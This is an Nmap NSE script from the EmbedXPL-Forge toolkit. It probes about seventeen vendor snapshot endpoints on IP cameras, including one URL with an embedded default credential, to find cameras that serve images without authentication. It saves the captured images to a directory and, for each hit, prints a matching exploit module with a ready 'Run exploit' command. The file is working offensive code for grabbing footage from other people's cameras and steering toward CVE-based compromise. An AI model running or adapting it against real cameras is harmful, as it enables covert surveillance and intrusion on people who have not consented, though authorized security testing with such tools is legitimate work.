-- embedxpl-camera-snapshot.nse
-- EmbedXPL-Forge NSE Script — Unauthenticated Camera Snapshot Capture
--
-- Author : André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: BSD
--
-- DESCRIPTION:
--   Attempts to capture a live snapshot from IP cameras without authentication
--   by probing vendor-specific snapshot endpoints. Detects:
--     - HTTP 200 + image/* Content-Type (confirmed unauth snapshot)
--     - HTTP 401/403 (auth required, endpoint exists)
--   Saves the detected snapshot URL and suggests EmbedXPL-Forge modules.
--
-- USAGE:
--   nmap -p 80,443,8080 --script embedxpl-camera-snapshot <target>
--   nmap -p 80 --script embedxpl-camera-snapshot --script-args outdir=/tmp/snaps 192.168.1.0/24
--
-- OUTPUT EXAMPLE:
--   80/tcp open http
--   | embedxpl-camera-snapshot:
--   |   SNAPSHOT (no auth): http://192.168.1.100:80/cgi-bin/snapshot.cgi?channel=1
--   |   Content-Type: image/jpeg
--   |   Size: 45231 bytes
--   |_  EmbedXPL: embedxpl > use exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044

local http   = require "http"
local nmap   = require "nmap"
local stdnse = require "stdnse"
local io     = require "io"
local os     = require "os"
local string = require "string"

description = [[
Tests IP cameras for unauthenticated snapshot access. Probes 30+ known
snapshot endpoints across Hikvision, Dahua, Axis, Reolink, Foscam, Vivotek,
and generic cameras. Reports accessible URLs and download size.
]]

author     = "André Henrique (@mrhenrike) | União Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "vuln", "safe", "discovery" }

portrule = function(host, port)
  return port.protocol == "tcp" and (
    port.number == 80   or
    port.number == 443  or
    port.number == 8080 or
    port.number == 8000 or
    port.number == 8443
  )
end

-- Snapshot endpoints per vendor
local SNAPSHOT_PATHS = {
  -- Dahua / Amcrest / Intelbras
  { path = "/cgi-bin/snapshot.cgi?channel=1",
    vendor = "Dahua",
    mod    = "exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044" },
  -- Hikvision ISAPI
  { path = "/ISAPI/Streaming/channels/101/picture",
    vendor = "Hikvision",
    mod    = "exploits/cameras/hikvision/info_disclosure_cve_2017_7921" },
  -- Hikvision legacy
  { path = "/onvif-http/snapshot?auth=YWRtaW46MTEK",
    vendor = "Hikvision (legacy)",
    mod    = "exploits/cameras/hikvision/info_disclosure_cve_2017_7921" },
  -- Axis
  { path = "/axis-cgi/jpg/image.cgi",
    vendor = "Axis",
    mod    = "exploits/cameras/axis/app_install_rce" },
  { path = "/jpg/image.jpg",
    vendor = "Axis / Generic",
    mod    = "exploits/cameras/multi/rtsp_cameradar_attack" },
  -- Reolink
  { path = "/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=nse",
    vendor = "Reolink",
    mod    = "exploits/cameras/reolink/reolink_baicells_auth_bypass_rce_cve_2021_40655" },
  -- Foscam
  { path = "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin&pwd=",
    vendor = "Foscam",
    mod    = "exploits/cameras/multi/rtsp_cameradar_attack" },
  -- Vivotek
  { path = "/cgi-bin/viewer/video.jpg",
    vendor = "Vivotek",
    mod    = "exploits/cameras/multi/rtsp_cameradar_attack" },
  -- Xiongmai / OEM
  { path = "/web/auto2012.jpg",
    vendor = "Xiongmai OEM",
    mod    = "exploits/cameras/xiongmai/uc_httpd_path_traversal" },
  -- Generic P2P
  { path = "/tmpfs/auto.jpg",
    vendor = "Generic P2P WiFi Cam",
    mod    = "exploits/cameras/multi/P2P_wificam_rce" },
  -- Generic
  { path = "/snapshot.jpg",
    vendor = "Generic",
    mod    = "exploits/cameras/multi/rtsp_cameradar_attack" },
  { path = "/snapshot.cgi",
    vendor = "Generic CGI",
    mod    = "exploits/cameras/multi/rtsp_cameradar_attack" },
  { path = "/cgi-bin/viewer/video.jpg?videotype=0&quality=2",
    vendor = "Vivotek/Generic",
    mod    = "exploits/cameras/multi/rtsp_cameradar_attack" },
  -- Tapo
  { path = "/stream",
    vendor = "TP-Link Tapo",
    mod    = "exploits/cameras/tapo/tapo_c200_c210_unauth_rce_cve_2021_4045" },
  -- Annke / HiSilicon OEM
  { path = "/cgi-bin/jpg/image.cgi",
    vendor = "ANNKE / HiSilicon OEM",
    mod    = "exploits/cameras/annke/annke_dvr_nvr_unauth_rce_cve_2021_32941" },
  -- Amcrest NVR
  { path = "/cgi-bin/snapshot.cgi?channel=1&subtype=1",
    vendor = "Amcrest",
    mod    = "exploits/cameras/amcrest/amcrest_camera_unauth_info_disclosure_cve_2019_3950" },
  -- MVPower JAWS DVR
  { path = "/tmpfs/snap.jpg",
    vendor = "MVPower DVR",
    mod    = "exploits/cameras/mvpower/dvr_jaws_rce" },
}

action = function(host, port)
  local outdir = stdnse.get_script_args("outdir")
  local output = stdnse.output_table()
  local found  = {}

  for _, probe in ipairs(SNAPSHOT_PATHS) do
    local resp = http.get(host, port, probe.path, { timeout = 5000 })
    if resp and resp.status then
      local ct = (resp.header and resp.header["content-type"]) or ""
      local url = ("http://%s:%d%s"):format(host.ip, port.number, probe.path)

      if resp.status == 200 and ct:match("image/") then
        local entry = {
          vendor       = probe.vendor,
          url          = url,
          content_type = ct,
          size         = tostring(#(resp.body or "")) .. " bytes",
          mod          = probe.mod,
        }
        table.insert(found, entry)

        -- Save snapshot if outdir specified
        if outdir and resp.body and #resp.body > 100 then
          local fname = outdir .. "/" ..
                        host.ip:gsub("%.", "_") .. "_" ..
                        port.number .. "_" ..
                        probe.path:gsub("[^%w]", "_") .. ".jpg"
          local f = io.open(fname, "wb")
          if f then
            f:write(resp.body)
            f:close()
          end
        end

      elseif resp.status == 401 or resp.status == 403 then
        local entry = {
          vendor  = probe.vendor,
          url     = url,
          status  = ("HTTP %d — auth required (endpoint exists)"):format(resp.status),
          mod     = probe.mod,
        }
        table.insert(found, entry)
      end
    end
  end

  if #found == 0 then
    return nil
  end

  for i, entry in ipairs(found) do
    local key = ("Endpoint %d (%s)"):format(i, entry.vendor)
    local sub = stdnse.output_table()
    sub["URL"]    = entry.url
    if entry.content_type then
      sub["Content-Type"]     = entry.content_type
      sub["Size"]             = entry.size
      sub["Access"]           = "UNAUTHENTICATED SNAPSHOT ACCESS"
    else
      sub["Access"]           = entry.status
    end
    sub["EmbedXPL module"] = entry.mod
    sub["Run exploit"]     = ("embedxpl > use %s"):format(entry.mod)
    output[key] = sub
  end

  return output
end
